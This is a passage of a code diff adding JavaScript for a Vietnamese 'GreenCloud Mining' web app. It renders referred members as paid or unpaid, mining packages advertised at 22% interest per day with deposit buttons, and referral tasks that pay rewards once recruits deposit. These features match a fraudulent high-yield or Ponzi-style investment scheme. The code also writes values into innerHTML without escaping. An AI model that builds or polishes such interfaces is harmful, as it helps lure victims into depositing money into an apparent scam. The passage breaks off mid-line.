+            <div style="font-size:10px; color:#64748b;">${m.time || 'Vừa xong'} • Tuyến: F1</div>
+          </div>
+          <div style="text-align:right;">
+            ${m.paid ? `
+              <span class="badge-pill">ĐÃ NẠP</span>
+            ` : `
+              <span style="font-size:10.5px; color:#64748b;">Chưa nạp</span>
+            `}
+          </div>
+        </div>
+      `).join('');
+    }
+
+    /* ========================================================
+       RENDER PACKAGES & TASKS
+    ======================================================== */
+    function renderPackages() {
+      const container = document.getElementById('packagesListWrap');
+      if (!container) return;
+      container.innerHTML = '';
+
+      for (const [key, pkg] of Object.entries(PACKAGES_CONFIG)) {
+        const owned = user.ownedPackages[key] || 0;
+        const div = document.createElement('div');
+        div.className = `package-card ${owned > 0 ? 'owned' : ''}`;
+        div.innerHTML = `
+          <div class="package-img-box">
+            <img class="package-img" src="${pkg.img}" alt="${pkg.name}" onerror="this.onerror=null;this.src='https://placehold.co/700x300/0f172a/10b981?text=GreenCloud+Mining';">
+            <div class="package-img-overlay"></div>
+            <div class="package-tag mono">⚡ ${pkg.cost === 0 ? 'TRẢI NGHIỆM' : 'LÃI 22%/NGÀY'}</div>
+          </div>
+          <div class="package-inner">
+            <div style="display:flex; justify-content:space-between; align-items:flex-start;">
+              <div>
+                <div style="font-weight:700; color:#fff; font-size:13.5px;">${pkg.name}</div>
+                <div style="font-size:11px; color:#94a3b8;">${pkg.hw}</div>
+              </div>
+              <div style="text-align:right;">
+                <div class="mono" style="font-weight:800; color:#10b981; font-size:14px;">${pkg.cost === 0 ? 'MIỄN PHÍ' : pkg.cost.toLocaleString('vi-VN') + ' đ'}</div>
+                <div class="mono" style="font-size:11px; color:#38bdf8;">+${pkg.dailyReturn.toLocaleString('vi-VN')} đ/ngày</div>
+              </div>
+            </div>
+            <div style="background:#020617; border-radius:8px; padding:8px 10px; margin:8px 0; font-size:11px; display:flex; justify-content:space-between;">
+              <span style="color:#94a3b8;">Đang sở hữu:</span>
+              <span class="badge-pill mono">${owned} dàn</span>
+            </div>
+            <div style="display:flex; gap:6px;">
+              <button class="btn btn-secondary btn-sm" onclick="window.showPackageDetail('${key}')">Chi tiết →</button>
+              ${key === 'free' ? (
+                owned === 0
+                  ? `<button class="btn btn-primary btn-sm" onclick="window.claimFreePackage()">🎁 Kích Hoạt Miễn Phí (0 đ)</button>`
+                  : `<button class="btn btn-secondary btn-sm" style="color:#34d399; border-color:#059669;" disabled>✓ Đang Đào (1 Dàn)</button>`
+              ) : (
+                `<button class="btn btn-primary btn-sm" onclick="window.openDepositModal()">Mua Thêm (+1)</button>`
+              )}
+            </div>
+          </div>
+        `;
+        container.appendChild(div);
+      }
+    }
+
+    function renderTasks() {
+      const container = document.getElementById('inviteTasksList');
+      if (!container) return;
+      container.innerHTML = '';
+
+      INVITE_TASKS.forEach(task => {
+        const isDone = (user.completedTasks || []).includes(task.id);
+        const currentPaid = user.refF1Paid || 0;
+        const percent = Math.min(100, Math.floor((currentPaid / task.target) * 100));
+        const canClaim = currentPaid >= task.target && !isDone;
+
+        const div = document.createElement('div');
+        div.className = 'card';
+        div.style.cssText = 'background:#020617; border-radius:10px; padding:10px; margin-top:8px; box-shadow:none;';
+        div.innerHTML = `
+          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+            <div>
+              <div style="font-weight:700; color:#fff; font-size:12px;">${task.title}</div>
+              <div class="mono" style="font-size:11px; color:#10b981; font-weight:700;">+${task.reward.toLocaleString('vi-VN')} đ</div>
+            </div>
+            <button class="btn ${canClaim ? 'btn-primary' : 'btn-seconda
